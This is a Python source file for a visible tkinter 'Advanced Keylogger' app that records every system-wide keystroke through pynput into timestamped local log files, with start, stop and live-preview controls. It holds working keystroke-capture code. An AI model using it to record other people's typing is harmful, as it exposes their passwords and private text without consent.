import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput.keyboard import Key, Listener
import threading
import datetime
import os

keys = []
listener = None
log_filename = None
running = False

def on_press(key):
    global keys
    keys.append(key)
    save_to_file(key)
    update_preview(key)

def save_to_file(key):
    global log_filename
    with open(log_filename, 'a') as f:  # append mode
        k = str(key).replace("'", "")
        f.write(k + " ")

def update_preview(key):
    k = str(key).replace("'", "")
    preview_box.insert(tk.END, k + " ")
    preview_box.see(tk.END)

def on_release(key):
    if key == Key.esc:
        return False

def start_logging():
    global listener, log_filename, keys, running
    if running:
        messagebox.showinfo("Keylogger", "Already running!")
        return
    running = True
    keys = []


    if not os.path.exists("logs"):
        os.makedirs("logs")


    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_filename = os.path.join("logs", f"log_{timestamp}.txt")

    status_label.config(text=f"Logging to: {log_filename}", fg="blue")
    preview_box.delete(1.0, tk.END)  # clear old preview

    listener = Listener(on_press=on_press, on_release=on_release)
    threading.Thread(target=listener.start, daemon=True).start()

def stop_logging():
    global listener, running
    if listener and running:
        listener.stop()
        running = False
        status_label.config(text="Logging stopped", fg="red")
        messagebox.showinfo("Keylogger", "Keylogging has been stopped.")

def open_logs():
    if os.name == "nt":  # Windows
        os.startfile("logs")
    elif os.name == "posix":  # macOS/Linux
        os.system("open logs" if "darwin" in os.sys.platform else "xdg-open logs")
    else:
        messagebox.showinfo("Logs", "Logs saved in 'logs' folder.")
root = tk.Tk()
root.title("Advanced Keylogger")
root.geometry("600x500")

title_label = tk.Label(root, text="🔑 Advanced Keylogger", font=("Arial", 22, "bold"))
title_label.pack(pady=20)

start_btn = tk.Button(root, text="▶ Start Logging", command=start_logging, width=20, height=2, bg="green", fg="white", font=("Arial", 14, "bold"))
start_btn.pack(pady=10)

stop_btn = tk.Button(root, text="⏹ Stop Logging", command=stop_logging, width=20, height=2, bg="red", fg="white", font=("Arial", 14, "bold"))
stop_btn.pack(pady=10)

log_btn = tk.Button(root, text="📂 Open Logs", command=open_logs, width=20, height=2, bg="blue", fg="white", font=("Arial", 14, "bold"))
log_btn.pack(pady=10)

status_label = tk.Label(root, text="Not logging", font=("Arial", 12), fg="gray")
status_label.pack(pady=10)

preview_label = tk.Label(root, text="Live Preview (last keys):", font=("Arial", 12, "italic"))
preview_label.pack()

preview_box = scrolledtext.ScrolledText(root, width=70, height=10, font=("Courier", 12))
preview_box.pack(pady=10)

root.mainloop()
